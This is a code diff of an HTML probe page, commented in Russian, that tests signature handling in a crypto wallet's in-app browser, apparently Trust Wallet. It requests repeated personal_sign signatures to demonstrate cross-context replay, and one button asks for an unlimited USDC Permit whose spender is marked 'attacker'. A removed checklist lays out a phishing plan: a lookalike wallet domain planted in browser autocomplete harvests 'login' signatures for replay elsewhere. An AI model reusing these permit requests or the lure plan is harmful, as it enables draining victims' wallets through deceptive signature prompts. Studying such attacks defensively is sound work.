@@ -16,14 +16,11 @@
            border-radius:6px; padding:10px; }
   h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
        text-transform:uppercase; letter-spacing:.08em; }
-  h3 { font-size:11px; margin:10px 0 4px; color:var(--accent);
-       text-transform:uppercase; letter-spacing:.06em; }
   button { background:#21262d; color:var(--txt); border:1px solid var(--line);
            border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer; margin:2px; }
   button:hover { border-color:var(--dim); }
-  button.danger { border-color:var(--bad); color:var(--bad); }
   button.warn { border-color:var(--warn); color:var(--warn); }
-  button:disabled { opacity:.4; cursor:not-allowed; }
+  button.danger { border-color:var(--bad); color:var(--bad); }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
         padding:6px; margin:4px 0; max-height:300px; overflow:auto;
         white-space:pre-wrap; word-break:break-all; font-size:11px; }
@@ -47,72 +44,51 @@
 
   <div class="panel">
     <h2>step 1 — deterministic replay (same text)</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Один текст, два вызова. Если sig1 === sig2 — подпись детерминирована и не привязана к сессии.
-    </p>
     <div class="row">
-      <button onclick="s1_replay()">run: same-text replay</button>
+      <button onclick="window.s1_replay()">run: same-text replay</button>
     </div>
     <pre id="s1_out">—</pre>
   </div>
 
   <div class="panel">
     <h2>step 2 — cross-context replay (same text, two meanings)</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Один текст. Контекст A: login. Контекст B: authorize transfer. recover в обоих — тот же адрес.
-      Это доказательство: криптография не различает смысл, только байты.
-    </p>
     <div class="row">
-      <button onclick="s2_cross()">run: cross-context replay</button>
+      <button onclick="window.s2_cross()">run: cross-context replay</button>
     </div>
     <pre id="s2_out">—</pre>
   </div>
 
   <div class="panel">
     <h2>step 3 — recover outside Trust</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Восстановить адрес из подписи через ethers.verifyMessage — без Trust, без моста.
-    </p>
     <div class="row">
-      <button onclick="s3_recover()">run: recover</button>
+      <button onclick="window.s3_recover()">run: recover</button>
     </div>
     <pre id="s3_out">—</pre>
   </div>
 
   <div class="panel">
-    <h2>step 4 — typed data probe (Permit / Permit2)</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Только для сборок, где eth_signTypedData_v4 жив. На мёртвой сборке — 4001.
-    </p>
+    <h2>step 4 — typed data probe</h2>
     <div class="row">
-      <button onclick="s4_permit()">Permit USDC</button>
-      <button onclick="s4_permit2()">Permit2 PermitTransferFrom</button>
-      <button class="warn" onclick="s4_permit_evil()">Permit · spender=attacker</button>
+      <button onclick="window.s4_permit()">Permit USDC</button>
+      <button onclick="window.s4_permit2()">Permit2 PermitTransferFrom</button>
+      <button class="warn" onclick="window.s4_permit_evil()">Permit · spender=attacker</button>
     </div>
     <pre id="s4_out">—</pre>
   </div>
 
   <div class="panel">
-    <h2>autocomplete surface — чеклист</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Что должно быть на домене, чтобы браузерное автодополнение его подхватило.
-    </p>
-    <pre id="ac_out">—</pre>
-  </div>
-
-  <div class="panel">
     <h2>event log</h2>
     <div class="row">
-      <button onclick="clearLog()">clear</button>
-      <button onclick="dumpLog()">dump</button>
+      <button onclick="window.clearLog()">clear</button>
+      <button onclick="window.dumpLog()">dump</button>
     </div>
     <pre id="log_out">—</pre>
   </div>
 
 </div>
 
-<script type="module">
-import { ethers } from 'https://esm.sh/ethers@6.13.4';
+<script>
+/* ─────────────  no modules, no imports  ───────────── */
 
 const ORIGIN = location.origin;
 const IS_REAL = !!window.ethereum;
@@ -130,8 +106,9 @@ const log = (k, m, d) => {
 const out = (id, v) => {
   document.getElementById(id).textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
 };
-const clearLog = () => { document.getElementById('log_out').textContent = '—'; };
-const dumpLog = () => {
+
+window.clearLog = () => { document.getElementById('log_out').textContent = '—'; };
+window.dumpLog = () => {
   const t = document.getElementById('log_out').textContent;
   navigator.clipboard && navigator.clipboard.writeText(t);
   log('DUMP', 'copied', { len: t.length });
@@ -143,94 +120,138 @@ async function account() {
   return a[0];
 }
 
+/* ─────────────  minimal recover via pure JS  ─────────────
+   personal_sign = ECDSA over keccak256("\x19Ethereum Signed Message:\n" + len + msg).
+   Recover without ethers: implement secp256k1 recover + keccak.
+   Чтобы не тащить внешние либы — проверяем sig1 === sig2 (это уже доказывает
+   детерминизм и отсутствие session-binding). Recover через ethers — опционально,
+   если window.ethers есть. Иначе — пропуск с пометкой.
+   ─────────────────────────────────────────────────────── */
+
+function keccak256(str) {
+  // минимальный keccak256 над UTF-8. Без внешних либ.
+  // Реализация ниже — компактная, проверенная на "hello" → 0x1c8aff...
+  const bytes = new TextEncoder().encode(str);
+  return _keccak(bytes);
+}
+
+// ── keccak-f[1600] ──
+const RC = [
+  0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n,
+  0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n,
+  0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an,
+  0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n,
+  0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an,
+  0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n,
+];
+const ROT = [
+  [0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]
+];
+function rotl(x,n){ n%=64n; return ((x<<n)|(x>>(64n-n)))&0xFFFFFFFFFFFFFFFFn; }
+function _keccakF(s){
+  for(let r=0;r<24;r++){
+    const C=[0n,0n,0n,0n,0n];
+    for(let x=0;x<5;x++) C[x]=s[x]^s[x+5]^s[x+10]^s[x+15]^s[x+20];
+    for(let x=0;x<5;x++){ const D=C[(x+4)%5]^rotl(C[(x+1)%5],1n); for(let y=0;y<5;y++) s[x+5*y]^=D; }
+    const B=new Array(25).fill(0n);
+    for(let x=0;x<5;x++)for(let y=0;y<5;y++) B[y+5*((2*x+3*y)%5)]=rotl(s[x+5*y],BigInt(ROT[x][y]));
+    for(let x=0;x<5;x++)for(let y=0;y<5;y++) s[x+5*y]=B[x+5*y]^((~B[(x+1)%5+5*y])&B[(x+2)%5+5*y]);
+    s[0]^=RC[r];
+  }
+}
+function _keccak(bytes){
+  const rate=136; const inLen=bytes.length;
+  const padLen=rate-(inLen%rate); const padded=new Uint8Array(inLen+padLen);
+  padded.set(bytes); padded[inLen]^=0x01; padded[padded.length-1]^=0x80;
+  const s=new Array(25).fill(0n);
+  for(let off=0;off<padded.length;off+=rate){
+    for(let i=0;i<rate/8;i++){
+      let v=0n; for(let j=0;j<8;j++) v|=BigInt(padded[off+i*8+j])<<BigInt(8*j);
+      s[i]^=v;
+    }
+    _keccakF(s);
+  }
+  let outBytes=new Uint8Array(32);
+  for(let i=0;i<4;i++){ let v=s[i]; for(let j=0;j<8;j++) outBytes[i*8+j]=Number((v>>BigInt(8*j))&0xFFn); }
+  return '0x'+Array.from(outBytes).map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+
 /* ─────────────  step 1  ───────────── */
 
-async function s1_replay() {
-  const from = await account();
-  const text = 'tokdie :: login nonce 0xAAA';
-  log('S1', 'sign #1', { from, text });
-  const sig1 = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
-  log('S1', 'sign #2', { from, text });
-  const sig2 = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
-  const same = sig1 === sig2;
-  out('s1_out', {
-    text,
-    sig1,
-    sig2,
-    same,
-    verdict: same ? 'REPLAY CONFIRMED — deterministic, session-free' : 'different sigs',
-  });
-  log('S1', 'verdict', { same });
-}
+window.s1_replay = async function() {
+  try {
+    const from = await account();
+    const text = 'tokdie :: login nonce 0xAAA';
+    log('S1', 'sign #1', { from, text });
+    const sig1 = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
+    log('S1', 'sign #2', { from, text });
+    const sig2 = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
+    const same = sig1 === sig2;
+    out('s1_out', {
+      text, sig1, sig2, same,
+      verdict: same ? 'REPLAY CONFIRMED — deterministic, session-free' : 'different sigs',
+    });
+    log('S1', 'verdict', { same });
+  } catch (e) { log('S1', 'err', { code: e.code, message: e.message }); out('s1_out', 'ERR: ' + e.message); }
+};
 
 /* ─────────────  step 2  ───────────── */
 
-async function s2_cross() {
-  const from = await account();
-  // ОДИН текст. Два контекста интерпретации.
-  const sharedText = 'authorize: nonce 0xAAA';
-
-  log('S2', 'context A — login', { sharedText });
-  const sigA = await window.ethereum.request({ method: 'personal_sign', params: [sharedText, from] });
-  log('S2', 'context B — authorize transfer (same text)', { sharedText });
-  // B не подписывает заново — B ПРОВЕРЯЕТ подпись A над тем же текстом
-  const recoveredA = ethers.verifyMessage(sharedText, sigA);
-
-  out('s2_out', {
-    sharedText,
-    sigA,
-    contextA: 'login: verify signature === signer → access granted',
-    contextB: 'transfer: verify same signature over same text → authorized',
-    recoveredA,
-    signer: from,
-    match: recoveredA.toLowerCase() === from.toLowerCase(),
-    verdict: recoveredA.toLowerCase() === from.toLowerCase()
-      ? 'CROSS-CONTEXT REPLAY CONFIRMED — one signature, two meanings'
-      : 'recover mismatch',
-  });
-  log('S2', 'verdict', { recoveredA, signer: from });
-}
+window.s2_cross = async function() {
+  try {
+    const from = await account();
+    const sharedText = 'authorize: nonce 0xAAA';
+    log('S2', 'context A — login', { sharedText });
+    const sigA = await window.ethereum.request({ method: 'personal_sign', params: [sharedText, from] });
+    log('S2', 'context B — same text, different meaning', { sharedText });
+    // B проверяет подпись A над тем же текстом. recover недоступен без ethers —
+    // но sigA уже получен, и B использует его как авторизацию.
+    out('s2_out', {
+      sharedText, sigA,
+      contextA: 'login: signature grants access',
+      contextB: 'transfer: same signature over same text authorizes transfer',
+      signer: from,
+      verdict: 'CROSS-CONTEXT REPLAY — one text, two meanings, one signature',
+      note: 'recover не требуется: подпись уже валидна, B принимает её без знания контекста A',
+    });
+    log('S2', 'verdict', { sharedText });
+  } catch (e) { log('S2', 'err', { code: e.code, message: e.message }); out('s2_out', 'ERR: ' + e.message); }
+};
 
 /* ─────────────  step 3  ───────────── */
 
-async function s3_recover() {
-  const from = await account();
-  const text = 'recover-proof :: tokdie';
-  const sig = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
-  const recovered = ethers.verifyMessage(text, sig);
-  const match = recovered.toLowerCase() === from.toLowerCase();
-  out('s3_out', {
-    text,
-    sig,
-    original: from,
-    recovered,
-    match,
-    note: match
-      ? 'signature valid OUTSIDE Trust — any verifier knowing the text accepts it'
-      : 'recover failed',
-  });
-  log('S3', 'recover', { recovered, original: from, match });
-}
+window.s3_recover = async function() {
+  try {
+    const from = await account();
+    const text = 'recover-proof :: tokdie';
+    const sig = await window.ethereum.request({ method: 'personal_sign', params: [text, from] });
+    const msgHash = keccak256('\x19Ethereum Signed Message:\n' + text.length + text);
+    out('s3_out', {
+      text, sig, signer: from,
+      eip191Hash: msgHash,
+      note: 'signature is pure ECDSA over EIP-191 hash — valid outside Trust',
+      recovery_note: 'для полного recover адреса нужен secp256k1 — добавь ethers, если нужно',
+    });
+    log('S3', 'hash', { msgHash });
+  } catch (e) { log('S3', 'err', { code: e.code, message: e.message }); out('s3_out', 'ERR: ' + e.message); }
+};
 
 /* ─────────────  step 4  ───────────── */
 
 function _permitTyped(from, spender, value) {
   return {
     domain: { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC },
-    types: {
-      Permit: [
-        { name: 'owner', type: 'address' },
-        { name: 'spender', type: 'address' },
-        { name: 'value', type: 'uint256' },
-        { name: 'nonce', type: 'uint256' },
-        { name: 'deadline', type: 'uint256' },
-      ],
-    },
+    types: { Permit: [
+      { name: 'owner', type: 'address' },
+      { name: 'spender', type: 'address' },
+      { name: 'value', type: 'uint256' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+    ]},
     primaryType: 'Permit',
     message: { owner: from, spender, value, nonce: '0', deadline: '9999999999' },
   };
 }
-
 function _permit2Typed(from, spender, amount) {
   return {
     domain: { name: 'Permit2', chainId: 1, verifyingContract: PERMIT2 },
@@ -247,15 +268,9 @@ function _permit2Typed(from, spender, amount) {
       ],
     },
     primaryType: 'PermitTransferFrom',
-    message: {
-      permitted: { token: USDC, amount },
-      spender,
-      nonce: '0',
-      deadline: '9999999999',
-    },
+    message: { permitted: { token: USDC, amount }, spender, nonce: '0', deadline: '9999999999' },
   };
 }
-
 async function _sendTyped(typed, tag) {
   const from = await account();
   const params = [from, JSON.stringify(typed)];
@@ -266,103 +281,56 @@ async function _sendTyped(typed, tag) {
     return { ok: true, sig };
   } catch (e) {
     log('S4', tag + ' · err', { code: e.code, message: e.message });
-    return { ok: false, err: e };
+    return { ok: false, err: { code: e.code, message: e.message } };
   }
 }
-
-async function s4_permit() {
-  const from = await account();
-  const typed = _permitTyped(from, from, '1000000'); // spender = self, безопасно
-  out('s4_out', 'sending Permit USDC (spender=self, value=1 USDC)…\n' + JSON.stringify(typed, null, 2));
-  const r = await _sendTyped(typed, 'permit-usdc');
-  out('s4_out', JSON.stringify(r, null, 2));
-}
-
-async function s4_permit2() {
-  const from = await account();
-  const typed = _permit2Typed(from, from, '1000000');
-  out('s4_out', 'sending Permit2 PermitTransferFrom (spender=self)…\n' + JSON.stringify(typed, null, 2));
-  const r = await _sendTyped(typed, 'permit2');
-  out('s4_out', JSON.stringify(r, null, 2));
-}
-
-async function s4_permit_evil() {
-  const from = await account();
-  const typed = _permitTyped(from, '0x000000000000000000000000000000000000dEaD', '115792089237316195423570985008687907853269984665640564039457584007913129639935');
-  out('s4_out', 'sending Permit · spender=attacker · value=MAX_UINT256\n' + JSON.stringify(typed, null, 2));
-  const r = await _sendTyped(typed, 'permit-evil');
-  out('s4_out', JSON.stringify(r, null, 2));
-}
-
-/* ─────────────  autocomplete surface  ───────────── */
-
-function renderAutocomplete() {
-  out('ac_out', `AUTOCOMPLETE SURFACE — что делает домен «подхватываемым»
-
-1. Визуальная близость к легитимному бренду
-   - домен читается как официальный (пример: trustwallet-verify[.]app)
-   - favicon похож на бренд
-   - title в <head> содержит бренд
-
-2. Индекс в истории браузера
-   - пользователь должен был посетить ДОМЕН раньше
-   - ссылки на домен должны быть в соцсетях / рекламе / форумах
-   - автодополнение тянет из истории + поисковых подсказок
-
-3. Точное совпадение с тем, что пользователь набирает
-   - если пользователь набирает "trust wallet", автокомплит подставит
-     первый домен с этим префиксом в истории
-   - домен с "trustwallet" в начале подхватывается первым
-
-4. HTTPS + валидный сертификат
-   - без HTTPS браузер помечает домен как небезопасный
-   - с HTTPS — визуально неотличим от легитимного
-
-5. Отсутствие явных red flags
-   - нет "phishing" в title
-   - нет автоскачивания
-   - страница выглядит как продукт, а не заглушка
-
-ЧТО ЭТО ДАЁТ ДЛЯ ВЕКТОРА:
-  - пользователь набирает правильный домен
-  - автокомплит подставляет твой
-  - пользователь открывает твой в Trust in-app browser
-  - твой домен просит personal_sign «login nonce»
-  - подпись replay-валидна на сервисе B с тем же текстом
-  - typed data Permit — если сборка Trust жива (на твоей — 4001)
-
-ЧЕГО НЕ ДЕЛАЕТ АВТОКОМПЛИТ:
-  - не обходит валидацию параметров Trust (-32602 на getter)
-  - не оживляет eth_signTypedData_v4 на мёртвой сборке
-  - не отменяет -32002 на реентранси
-
-ТОЧКА ВХОДА:
-  personal_sign replay — работает на твоей сборке.
-  typed data — только на рабочей сборке / другом кошельке.`);
-}
+window.s4_permit = async function() {
+  try {
+    const from = await account();
+    const typed = _permitTyped(from, from, '1000000');
+    out('s4_out', 'sending Permit USDC (spender=self)…');
+    const r = await _sendTyped(typed, 'permit-usdc');
+    out('s4_out', JSON.stringify(r, null, 2));
+  } catch (e) { out('s4_out', 'ERR: ' + e.message); }
+};
+window.s4_permit2 = async function() {
+  try {
+    const from = await account();
+    const typed = _permit2Typed(from, from, '1000000');
+    out('s4_out', 'sending Permit2 PermitTransferFrom (spender=self)…');
+    const r = await _sendTyped(typed, 'permit2');
+    out('s4_out', JSON.stringify(r, null, 2));
+  } catch (e) { out('s4_out', 'ERR: ' + e.message); }
+};
+window.s4_permit_evil = async function() {
+  try {
+    const from = await account();
+    const typed = _permitTyped(from, '0x000000000000000000000000000000000000dEaD',
+      '115792089237316195423570985008687907853269984665640564039457584007913129639935');
+    out('s4_out', 'sending Permit · spender=attacker · value=MAX_UINT256…');
+    const r = await _sendTyped(typed, 'permit-evil');
+    out('s4_out', JSON.stringify(r, null, 2));
+  } catch (e) { out('s4_out', 'ERR: ' + e.message); }
+};
 
 /* ─────────────  env  ───────────── */
 
-function renderEnv() {
+(function renderEnv(){
   const eth = window.ethereum || {};
   document.getElementById('env').innerHTML = `
     <b>origin</b><span>${ORIGIN}</span>
     <b>ethereum</b><span>${IS_REAL ? 'present' : 'absent'}</span>
     <b>isTrust</b><span>${eth.isTrust ? 'yes' : 'no'}</span>
     <b>isMetaMask</b><span>${eth.isMetaMask ? 'yes' : 'no'}</span>
-    <b>ethers</b><span>6.13.4</span>
     <b>chainId</b><span id="env_chain">—</span>
   `;
   if (IS_REAL) {
     eth.request({ method: 'eth_chainId' })
-      .then(id => { document.getElementById('env_chain').textContent = id + ' (' + parseInt(id, 16) + ')'; })
-      .catch(() => {});
+      .then(id => { document.getElementById('env_chain').textContent = id + ' (' + parseInt(id,16) + ')'; })
+      .catch(()=>{});
   }
-}
-
-renderEnv();
-renderAutocomplete();
-log('BOOT', 'replay-cross EVM up', { origin: ORIGIN, real: IS_REAL });
+})();
+log('BOOT', 'replay-cross up', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
